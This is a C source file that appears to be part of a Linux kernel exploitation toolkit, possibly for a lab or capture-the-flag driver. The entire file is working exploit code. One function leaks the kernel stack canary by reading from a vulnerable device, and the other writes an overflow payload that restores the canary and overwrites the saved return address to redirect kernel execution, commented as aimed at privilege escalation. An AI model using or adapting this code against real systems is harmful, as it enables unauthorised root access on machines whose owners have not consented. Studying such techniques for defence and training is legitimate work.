#include "stack_overflow.h"
#include "utils.h"

/* Leak kernel stack cookie */
uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
{
    uintptr_t *leaks = calloc(leak_slots, sizeof(uintptr_t));
    if (!leaks)
        DIE("calloc");

    size_t cookie_slot = cookie_offset / sizeof(uintptr_t);
    if (cookie_slot >= leak_slots) {
        FAILURE("cookie_offset (0x%zx) out of bounds: leak buffer only has %zu bytes\n",
                cookie_offset, leak_slots * sizeof(uintptr_t));
        free(leaks);
        DIE("leak_cookie");
    }

    ssize_t nread = read(fd, leaks, leak_slots * sizeof(uintptr_t));
    if (nread < 0)
        DIE("read");

    hexdump("[DEBUG] Leaks", leaks, leak_slots * sizeof(uintptr_t));

    uintptr_t cookie = leaks[cookie_slot];
    SUCCESS("Read %zd (0x%zx) bytes from device; cookie = 0x%lx @ offset 0x%zx (slot #%zu)",
            nread, (size_t)nread, (unsigned long)cookie, cookie_offset, cookie_slot);

    free(leaks);
    return cookie;
}

/* Kernel stack overflow with RIP overwrite */
void stack_overflow(int fd, 
                    uintptr_t cookie, size_t cookie_offset, 
                    size_t pl_len, 
                    uintptr_t ret_addr)
{
    size_t pl_slots = pl_len / sizeof(uintptr_t);

    uintptr_t *pl = calloc(pl_slots, sizeof(uintptr_t));
    if (!pl)
        DIE("calloc");

    size_t pos = cookie_offset / sizeof(uintptr_t);
    if (pos + 4 >= pl_slots) {
        FAILURE(
            "Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
            pl_len,
            cookie_offset + 5 * sizeof(uintptr_t)
        );
        free(pl);
        DIE("payload");
    }

    pl[pos++] = cookie;     // Canary
    pl[pos++] = 0x0;        // rbx
    pl[pos++] = 0x0;        // r12
    pl[pos++] = 0x0;        // saved rbp
    pl[pos++] = ret_addr;   // ret addr (e.g. privesc)

    hexdump("[DEBUG] Payload", pl, pl_len);
    INFO("Hijack return address on kernel stack to: 0x%016lx", (unsigned long)ret_addr);

    ssize_t written = write(fd, pl, pl_len);
    if (written < 0)
        DIE("write");

    SUCCESS("%zd bytes of payload written", written);
    free(pl);
}


